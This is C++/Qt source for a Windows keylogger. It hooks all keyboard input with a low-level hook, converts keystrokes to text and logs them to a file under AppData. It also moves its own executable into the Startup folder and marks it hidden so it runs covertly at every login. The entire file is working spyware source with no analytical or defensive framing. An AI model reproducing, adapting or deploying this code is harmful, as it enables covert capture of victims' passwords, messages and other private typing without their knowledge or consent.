#include "core.h"

static HHOOK hHook = nullptr;
static QByteArray outputBuffer;
static QFile output;
static QTimer *timer;

static QStringList actionKeys = {
    "[BACKSPACE]",
    "[ENTER]"
};

Core::Core(QObject *parent) :
    QObject(parent)
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);

    if (hHook == nullptr) {
        QCoreApplication::exit(1);
    }

    QString outputDirPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
    QDir outputDir = QDir(outputDirPath);

    if (!outputDir.exists()) {
        outputDir.mkdir(outputDir.absolutePath());
    }

    QString outputPath = outputDir.absolutePath() + QDir::separator() + QString(OUTPUT_NAME);
    output.setFileName(outputPath);

    if (!output.open(QFile::Append | QFile::Text)) {
        QCoreApplication::exit(1);
    }

    QString startupDirPath;

    startupDirPath.append(QStandardPaths::writableLocation(QStandardPaths::ApplicationsLocation));
    startupDirPath.append(QDir::separator());
    startupDirPath.append("Startup");

    if (QDir(startupDirPath).exists()) {
        QString currentFilePath = QCoreApplication::applicationFilePath();
        QString newFilePath = startupDirPath + QDir::separator() + QFileInfo(currentFilePath).fileName();

        if (currentFilePath != newFilePath) {
            QFile::rename(currentFilePath, newFilePath);
        }

        if (QFile::exists(newFilePath)) {
            DWORD attributes = GetFileAttributes((const wchar_t *) newFilePath.utf16());

            if (!(attributes & FILE_ATTRIBUTE_HIDDEN)) {
                SetFileAttributes((const wchar_t *) newFilePath.utf16(), FILE_ATTRIBUTE_HIDDEN);
            }
        }
    }

    timer = new QTimer(this);
    QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
    timer->setInterval(INTERVAL);
    timer->start();
}

Core::~Core()
{
    if (output.isOpen()) {
        writeOutput();
        output.close();
    }
}

void Core::update(BYTE *keyState, int keyCode)
{
    keyState[keyCode] = BYTE(GetKeyState(keyCode));
}

LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        timer->stop();

        KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);

        wchar_t buffer[6];
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        update(keyboardState, VK_SHIFT);
        update(keyboardState, VK_CAPITAL);
        update(keyboardState, VK_CONTROL);
        update(keyboardState, VK_MENU);

        HKL keyboardLayout = GetKeyboardLayout(0);
        char lpszName[0x100] = {0};
        DWORD dWordMessage = 1;
        dWordMessage += key.scanCode << 16;
        dWordMessage += key.flags << 24;

        int i = GetKeyNameText(dWordMessage, (LPTSTR) lpszName, 255);
        ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);

        buffer[5] = L'\0';

        QString toBeAppended;

        if (i > 1) {
            QString keyString = QString::fromUtf16((ushort *) lpszName);

            if (keyString == "ENTER") {
                toBeAppended = "\n[" + keyString + "]\n";
            } else if (keyString == "BACKSPACE" && !outputBuffer.isEmpty()) {
                int toChop = 1;

                foreach (QString actionKey, actionKeys) {
                    QByteArray actionKeyByteArray = QByteArray::fromStdString(actionKey.toStdString());

                    QList<QByteArray> actionKeyVersions;
                    actionKeyVersions.append(actionKeyByteArray);
                    actionKeyVersions.append(actionKeyByteArray.append('\n'));

                    foreach (QByteArray actionKeyVersion, actionKeyVersions) {
                        if (outputBuffer.endsWith(actionKeyVersion)) {
                            toChop = actionKeyVersion.length();
                            break;
                        }
                    }

                    if (toChop > 1) { break; }
                }

                outputBuffer.chop(toChop);
            } else {
                toBeAppended = QString::fromUtf16((ushort *) buffer);
            }
        } else {
            toBeAppended = QString::fromUtf16((ushort *) buffer);
        }

        outputBuffer.append(toBeAppended);
        timer->start();
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void Core::writeOutput()
{
    if (!outputBuffer.isEmpty()) {
        QTextStream outputStream(&output);
        outputStream << outputBuffer << endl;
        outputBuffer.clear();
    }
}
